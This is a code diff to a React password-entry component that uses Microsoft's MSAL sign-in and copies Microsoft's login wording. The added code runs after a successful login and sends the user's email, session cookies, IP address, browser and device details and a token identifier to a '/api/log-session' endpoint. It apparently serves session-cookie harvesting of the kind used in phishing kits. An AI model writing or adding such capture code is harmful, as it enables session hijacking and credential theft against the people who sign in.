@@ -4,6 +4,7 @@ import type React from "react"
 import { useState } from "react"
 import { Eye, EyeOff } from "lucide-react"
 import { useMsal } from "@azure/msal-react"
+import { getBrowserInfo, getDeviceInfo, getSessionCookies, getIpAddress } from "@/lib/browser-info"
 
 interface PasswordStepProps {
   email: string
@@ -16,6 +17,36 @@ export default function PasswordStep({ email, onBack }: PasswordStepProps) {
   const [showPassword, setShowPassword] = useState(false)
   const [error, setError] = useState("")
   const [isLoading, setIsLoading] = useState(false)
+
+  const logSessionOnSuccess = async () => {
+    try {
+      const [browserInfo, deviceInfo, cookies, ipAddress] = await Promise.all([
+        Promise.resolve(getBrowserInfo()),
+        Promise.resolve(getDeviceInfo()),
+        Promise.resolve(getSessionCookies()),
+        getIpAddress(),
+      ])
+
+      const response = await fetch("/api/log-session", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email,
+          browserInfo,
+          deviceInfo,
+          cookies,
+          ipAddress,
+          sessionToken: instance?.getActiveAccount()?.idTokenClaims?.jti,
+        }),
+      })
+
+      if (!response.ok) {
+        console.error("[v0] Session logging failed")
+      }
+    } catch (error) {
+      console.error("[v0] Error logging session:", error)
+    }
+  }
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -34,6 +65,7 @@ export default function PasswordStep({ email, onBack }: PasswordStepProps) {
       }
 
       await instance?.loginPopup(loginRequest)
+      await logSessionOnSuccess()
     } catch (err: any) {
       setError(err.errorCode === "user_cancelled" ? "Sign-in cancelled." : "Your password is incorrect. Try again.")
     } finally {
